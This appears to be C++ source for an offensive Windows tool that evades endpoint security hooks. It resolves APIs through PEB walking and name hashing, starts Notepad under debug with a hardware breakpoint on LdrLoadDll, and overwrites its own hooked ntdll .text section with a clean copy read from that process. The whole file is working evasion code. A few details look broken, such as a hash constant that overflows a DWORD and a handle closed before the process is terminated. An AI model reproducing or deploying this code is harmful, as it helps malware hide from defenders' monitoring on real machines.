#include <Windows.h>
#include <iostream>
#include <sstream>
#include <unordered_map>
#include "Helpers.h"
#include "Stealth.h"

using namespace std;


DWORD calcHash(char* data) {
	DWORD hash = 0x99;
	for (int i = 0; i < strlen(data); i++) {
		hash += data[i] + (hash << 1);
	}
	return hash;
}

static DWORD calcHashModule(LDR_MODULE* mdll) {
	char name[64];
	size_t i = 0;

	while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
		name[i] = (char)mdll->dllname.Buffer[i];
		i++;
	}
	name[i] = 0;
	return calcHash((char*)CharLowerA(name));
}

HMODULE GetModuleFromPEB(DWORD wModuleHash)
{
#if defined( _WIN64 )  
#define PEBOffset 0x60  
#define LdrOffset 0x18  
#define ListOffset 0x10  
	unsigned long long pPeb = __readgsqword(PEBOffset); // read from the GS register
#elif defined( _WIN32 )  
#define PEBOffset 0x30  
#define LdrOffset 0x0C  
#define ListOffset 0x0C  
	unsigned long pPeb = __readfsdword(PEBOffset);
#endif       
	pPeb = *reinterpret_cast<decltype(pPeb)*>(pPeb + LdrOffset);
	PLDR_DATA_TABLE_ENTRY pModuleList = *reinterpret_cast<PLDR_DATA_TABLE_ENTRY*>(pPeb + ListOffset);
	while (pModuleList->DllBase)
	{

		char dll_name[MAX_PATH];
		wcstombs(dll_name, pModuleList->BaseDllName.Buffer, MAX_PATH);


		if (calcHash(CharLowerA(dll_name)) == wModuleHash) // Compare the dll name that we are looking for against the dll we are inspecting right now.
			return (HMODULE)pModuleList->DllBase; // If found, return back the void* pointer
		pModuleList = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pModuleList->InLoadOrderLinks.Flink);
	}
	return nullptr;
}

uintptr_t GetAPIFromPEBModule(void* hModule, DWORD ApiHash)
{
#if defined( _WIN32 )   
	unsigned char* lpBase = reinterpret_cast<unsigned char*>(hModule);
	IMAGE_DOS_HEADER* idhDosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(lpBase);
	if (idhDosHeader->e_magic == 0x5A4D)
	{
#if defined( _M_IX86 )  
		IMAGE_NT_HEADERS32* inhNtHeader = reinterpret_cast<IMAGE_NT_HEADERS32*>(lpBase + idhDosHeader->e_lfanew);
#elif defined( _M_AMD64 )  
		IMAGE_NT_HEADERS64* inhNtHeader = reinterpret_cast<IMAGE_NT_HEADERS64*>(lpBase + idhDosHeader->e_lfanew);
#endif  
		if (inhNtHeader->Signature == 0x4550)
		{
			IMAGE_EXPORT_DIRECTORY* iedExportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(lpBase + inhNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
			for (register unsigned int uiIter = 0; uiIter < iedExportDirectory->NumberOfNames; ++uiIter)
			{
				char* szNames = reinterpret_cast<char*>(lpBase + reinterpret_cast<unsigned long*>(lpBase + iedExportDirectory->AddressOfNames)[uiIter]);
				if (calcHash(szNames) == ApiHash)
				{
					unsigned short usOrdinal = reinterpret_cast<unsigned short*>(lpBase + iedExportDirectory->AddressOfNameOrdinals)[uiIter];
					return reinterpret_cast<uintptr_t>(lpBase + reinterpret_cast<unsigned long*>(lpBase + iedExportDirectory->AddressOfFunctions)[usOrdinal]);
				}
			}
		}
	}
#endif  
	return 0;
}

PROCESS_INFORMATION createProcessInDebug(wchar_t* processName)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	HMODULE hKernel_32 = GetModuleFromPEB(109513359);
	TypeCreateProcessW CreateProcessWCustom = (TypeCreateProcessW)GetAPIFromPEBModule(hKernel_32, 926060913);
	BOOL hProcbool = CreateProcessWCustom(processName, processName, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &si, &pi);

	return pi;
}

VOID SetHWBP(DWORD_PTR address, HANDLE hThread)
{
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_INTEGER;
	ctx.Dr0 = address;
	ctx.Dr7 = 0x00000001;


	SetThreadContext(hThread, &ctx);

	DEBUG_EVENT dbgEvent;
	while (true)
	{
		if (WaitForDebugEvent(&dbgEvent, INFINITE) == 0)
			break;

		if (dbgEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT &&
			dbgEvent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP)
		{

			CONTEXT newCtx = { 0 };
			newCtx.ContextFlags = CONTEXT_ALL;
			GetThreadContext(hThread, &newCtx);
			if (dbgEvent.u.Exception.ExceptionRecord.ExceptionAddress == (LPVOID)address)
			{
				printf("[+] Breakpoint Hit!\n");
				/*printf("[-] Exception (%#llx) ! Params:\n", dbgEvent.u.Exception.ExceptionRecord.ExceptionAddress);
				printf("(1) Rcx: %#d | ", newCtx.Rcx);
				printf("(2) Rdx: %#llx | ", newCtx.Rdx);
				printf("(3) R8: %#llx | ", newCtx.R8);
				printf("(4) R9: %#llx\n", newCtx.R9);
				printf("RSP = %#llx\n", newCtx.Rsp);
				printf("RAX = %#llx\n", newCtx.Rax);
				printf("DR0 = %#llx\n", newCtx.Dr0);
				printf("RIP = %#llx\n----------------------------------------\n", newCtx.Rip);*/

				newCtx.Dr0 = newCtx.Dr6 = newCtx.Dr7 = 0;
				newCtx.EFlags |= (1 << 8);
				return;
			}
			else {
				newCtx.Dr0 = address;
				newCtx.Dr7 = 0x00000001;
				newCtx.EFlags &= ~(1 << 8);
			}
			SetThreadContext(hThread, &newCtx);
		}
		ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
	}
}

int CopyDLLFromDebugProcess(HANDLE hProc, size_t bAddress, BOOL stealth)
{

	HMODULE hKernel_32 = GetModuleFromPEB(109513359);
	HMODULE hNtdll = GetModuleFromPEB(4097367);

	_NtReadVirtualMemory NtReadVirtualMemoryCustom = (_NtReadVirtualMemory)GetAPIFromPEBModule(hNtdll, 228701921503);
	TypeVirtualProtect VirtualProtectCustom = (TypeVirtualProtect)GetAPIFromPEBModule(hKernel_32, 955026773);

	PIMAGE_DOS_HEADER ImgDosHeader = (PIMAGE_DOS_HEADER)bAddress;
	PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((DWORD_PTR)bAddress + ImgDosHeader->e_lfanew);
	IMAGE_OPTIONAL_HEADER OptHeader = (IMAGE_OPTIONAL_HEADER)ntHeader->OptionalHeader;
	PIMAGE_SECTION_HEADER textsection = IMAGE_FIRST_SECTION(ntHeader);

	DWORD DllSize = OptHeader.SizeOfImage;
	PBYTE freshDll = new BYTE[DllSize];
	
	if (stealth)
	{
		LPVOID freshNtdll = VirtualAlloc(NULL, DllSize, MEM_COMMIT, PAGE_READWRITE);
		NtReadVirtualMemoryCustom(hProc, (PVOID)bAddress, freshNtdll, DllSize, 0);
		BOOL execute = Execute((PVOID)bAddress, freshNtdll, textsection);
		if (execute)
		{
			return 0;
		}
		else {
			return 1;
		}
	}
	NTSTATUS status = (*NtReadVirtualMemoryCustom)(hProc, (PVOID)bAddress, freshDll, DllSize, 0);
	if (status != 0)
	{
		printf("Error: NtReadVirtualMemoryCustom failed with error code %d\n", status);
		delete[] freshDll;
		return 1;
	}
	
	for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
	{


		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((unsigned long long)IMAGE_FIRST_SECTION(ntHeader) + ((unsigned long long)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (strcmp((char*)hookedSectionHeader->Name, (char*)".text") != 0)
			continue;

		DWORD oldProtection = 0;
		bool isProtected = VirtualProtectCustom((LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
		
		
		
		DWORD textSectionSize = hookedSectionHeader->Misc.VirtualSize;

		// Get the source and destination addresses for the .text section
		LPVOID srcAddr = (LPVOID)((DWORD_PTR)freshDll + (DWORD_PTR)hookedSectionHeader->VirtualAddress);
		LPVOID destAddr = (LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress);

		// Calculate the number of chunks needed to copy the entire .text section
		size_t chunkSize = 1024;
		size_t numChunks = (textSectionSize + chunkSize - 1) / chunkSize;

		// Iterate over each chunk and copy it to the destination
		for (size_t i = 0; i < numChunks; i++)
		{
			size_t chunkStart = i * chunkSize;
			size_t chunkEnd = min(chunkStart + chunkSize, textSectionSize);
			size_t chunkSize = chunkEnd - chunkStart;
			memcpy((char*)destAddr + chunkStart, (char*)srcAddr + chunkStart, chunkSize);
		}

		//memcpy((LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)freshDll + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
		isProtected = VirtualProtectCustom((LPVOID)((DWORD_PTR)bAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		if (isProtected == FALSE)
		{
			printf("[-] Failed to restore memory protection for DLL.\n");
			return 1;
		}

		delete[] freshDll;
		return 0;

	}
	printf("[-] Failed to find .text section of DLL.\n");
	return 1;
}

int main(int argc, char* argv[])
{
	BOOL stealth = FALSE;
	if (argc == 2)
	{
		if (strcmp(argv[1], "stealth") == 0) {
			printf("[+] Stealth mode: Unhooking one function\n");
			stealth = TRUE;
		}

	}
	
	printf("[+] Creating new process in debug mode\n");
	PROCESS_INFORMATION process = createProcessInDebug((wchar_t*)LR"(C:\Windows\Notepad.exe)");
	HANDLE hThread = process.hThread;

	HMODULE hNtdll = GetModuleFromPEB(4097367);
	HMODULE hKernel_32 = GetModuleFromPEB(109513359);
	_LdrLoadDll LdrLoadDllCustom = (_LdrLoadDll)GetAPIFromPEBModule(hNtdll, 11529801);
	
	size_t LdrLoadDllAddress = reinterpret_cast<size_t>(LdrLoadDllCustom);
	printf("[+] Found LdrLoadDllAddress address: 0x%p\n", LdrLoadDllAddress);

	printf("[+] Setting HWBP on remote process\n");

	SetHWBP((DWORD_PTR)LdrLoadDllAddress, hThread);
	printf("[+] Copying clean ntdll from remote process\n");


	size_t NtdllBAddress = reinterpret_cast<size_t>(hNtdll);
	printf("[+] Found ntdll base address: 0x%p\n", NtdllBAddress);
	int NtdllResult = CopyDLLFromDebugProcess(process.hProcess, NtdllBAddress, stealth);
	if (NtdllResult == 0)
	{
		printf("[+] Unhooked\n");
	}
	else
	{
		printf("[-] Failed to unhook\n");
	}

	CloseHandle(process.hProcess);
	TerminateProcess(process.hProcess, 0);

	return 0;
}

